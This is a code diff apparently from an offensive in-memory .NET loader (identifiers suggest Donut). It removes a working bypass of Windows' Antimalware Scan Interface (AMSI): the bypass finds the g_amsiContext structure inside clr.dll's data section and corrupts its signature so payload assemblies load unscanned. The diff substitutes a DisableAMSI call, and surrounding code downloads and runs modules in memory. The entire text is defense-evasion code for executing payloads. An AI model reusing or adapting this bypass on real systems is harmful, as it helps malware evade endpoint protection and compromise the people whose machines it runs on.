@@ -92,7 +92,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
       DPRINT("Instance is URL");
       if(!DownloadModule(inst)) return -1;
     }
-
+    
     // allocate console for modules that require access
     // to a console..
     #if !defined(DEBUG)
@@ -100,7 +100,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     #endif
     
     inst->api.AttachConsole(inst->api.GetCurrentProcessId());
-    
+
     if(LoadAssembly(inst, &assembly)) {
       RunAssembly(inst, &assembly);
     }
@@ -119,13 +119,10 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     BSTR            domain;
     SAFEARRAYBOUND  sab;
     SAFEARRAY       *sa;
-    DWORD           i, cbSize, dwRelease;
+    DWORD           i;
     BOOL            loaded=FALSE, loadable, amsi;
     PBYTE           p;
     HMODULE         hAMSI;
-    PAMSICONTEXT    AmsiCtx = NULL;
-    LSTATUS         lStatus;
-    CHAR            szVersion[32];
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -206,79 +203,16 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
           pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
           
         if(SUCCEEDED(hr)) {
-          // Get the Release value of v4 framework
-          lStatus = inst->api.SHGetValueA(
-            HKEY_LOCAL_MACHINE, 
-            inst->subkey, inst->value, 
-            0, &dwRelease, &cbSize);
-         
-          DPRINT("GetValue(Release) returned lStatus : %08lx", 
-            lStatus);
-          
-          // If GetValue was successful
-          // We're running >= v4.5
-          if(lStatus == ERROR_SUCCESS) {
-            DPRINT("Framework Release : %08lx", dwRelease);
-            // if release >= v4.8
-            if(dwRelease >= 528049) {
-              // Get module handle for AMSI.dll
-              hAMSI = inst->api.GetModuleHandle(inst->amsi);
-              if(hAMSI == NULL) {
-                // Try force CLR to load and initialize g_amsiContext
-                // by using a harmless .NET assembly
-                DPRINT("SafeArrayCreate(%lli bytes)", inst->decoy_len);
-                
-                sab.lLbound   = 0;
-                sab.cElements = inst->decoy_len;
-                sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
-                
-                if(sa != NULL) {
-                  DPRINT("Copying decoy assembly to safe array");
-                  
-                  for(i=0, p=sa->pvData; i<inst->decoy_len; i++) {
-                    p[i] = inst->decoy[i];
-                  }
-
-                  DPRINT("AppDomain::Load_3(decoy)");
-                  
-                  hr = pa->ad->lpVtbl->Load_3(
-                    pa->ad, sa, &pa->as);
-
-                  DPRINT("HRESULT : %08lx", hr);
-                  DPRINT("Erasing decoy assembly from memory");
-                  
-                  for(i=0, p=sa->pvData; i<inst->decoy_len; i++) {
-                    p[i] = inst->decoy[i] = 0;
-                  }
-                  DPRINT("SafeArrayDestroy");
-                  inst->api.SafeArrayDestroy(sa);
-                }
-              }
-            }
-          }
-         
-          // check if AMSI loaded
-          hAMSI = inst->api.GetModuleHandle(inst->amsi);
-          
-          if(hAMSI != NULL) {
-            // Try find g_amsiContext
-            DPRINT("Detected AMSI");
-            // Search the CLR data section
-            amsi = FindAMSIContext(inst, &AmsiCtx);
-            DPRINT("AMSI Context %s", amsi ? "FOUND" : "NOT FOUND");
-          }
+          // Try to disable AMSI
+          DPRINT("Detected AMSI");
+          amsi = DisableAMSI(inst);
+          DPRINT("DisableAMSI %s", amsi ? "OK" : "FAILED");
             
           sab.lLbound   = 0;
           sab.cElements = mod->len;
           sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
           
           if(sa != NULL) {
-            // If g_amsiContext was found 
-            // Disable AMSI by corrupting the signature value
-            if(AmsiCtx != NULL) {
-              AmsiCtx->Signature++;
-            }
-              
             DPRINT("Copying assembly to safe array");
             
             for(i=0, p=sa->pvData; i<mod->len; i++) {
@@ -298,12 +232,6 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
             
             for(i=0, p=sa->pvData; i<mod->len; i++) {
               p[i] = mod->data[i] = 0;
-            }
-
-            // If g_amsiContext was found 
-            // Re-enable AMSI by fixing the signature value
-            if(AmsiCtx != NULL) {
-              AmsiCtx->Signature--;
             }
             
             DPRINT("SafeArrayDestroy");
@@ -531,78 +459,6 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
       pa->icmh->lpVtbl->Release(pa->icmh);
       pa->icmh = NULL;
     }
-}
-
-// Attempt to find AMSI context in .data section of CLR.dll
-// Could also scan PEB.ProcessHeap for this..
-// Disabling AMSI via AMSI context is based on idea by Matt Graeber
-// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9
-
-BOOL FindAMSIContext(PDONUT_INSTANCE inst, PAMSICONTEXT *pac) {
-    LPVOID                   hCLR;
-    BOOL                     found = FALSE;
-    PIMAGE_DOS_HEADER        dos;
-    PIMAGE_NT_HEADERS        nt;
-    PIMAGE_SECTION_HEADER    sh;
-    DWORD                    i, j, res;
-    PBYTE                    ds;
-    MEMORY_BASIC_INFORMATION mbi;
-    AMSICONTEXT              *ctx;
-    
-    *pac = NULL;
-    
-    DPRINT("Obtaining base address of CLR");
-    hCLR = inst->api.GetModuleHandle(inst->clr);
-    
-    if(hCLR != NULL) {
-      DPRINT("Locating .data section");
-      dos = (PIMAGE_DOS_HEADER)hCLR;  
-      nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos->e_lfanew);  
-      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
-             nt->FileHeader.SizeOfOptionalHeader);
-             
-      for(i = 0; 
-          i < nt->FileHeader.NumberOfSections && !found; 
-          i++) 
-      {
-        // if this section is writeable, assume it's data
-        if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
-          DPRINT("Found writeable section %s", sh[i].Name);
-          // scan section for pointers to the heap
-          ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);
-          DPRINT("Virtual address is %p", ds);
-           
-          for(j = 0; 
-              j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
-              j += sizeof(ULONG_PTR)) 
-          {
-            // check if "AMSI" is present
-            ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
-            // query the pointer
-            res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
-            if(res != sizeof(mbi)) continue;
-            
-            // if it's a pointer to heap or stack
-            if ((mbi.State   == MEM_COMMIT    ) &&
-                (mbi.Type    == MEM_PRIVATE   ) && 
-                (mbi.Protect == PAGE_READWRITE))
-            {
-              ctx = (AMSICONTEXT*)ptr;
-              // check if it contains the signature 
-              if(ctx->Signature == *(DWORD*)&inst->amsi) {
-                DPRINT("Found g_amsiContext at %p", (PVOID)&ds[j]);
-                DPRINT("Heap address is %p", (PVOID)ptr);
-                // store in pointer
-                *pac = ctx;
-                found = TRUE;
-                break;
-              }
-            }
-          }
-        }
-      }
-    }
-    return found;
 }
 
 /**
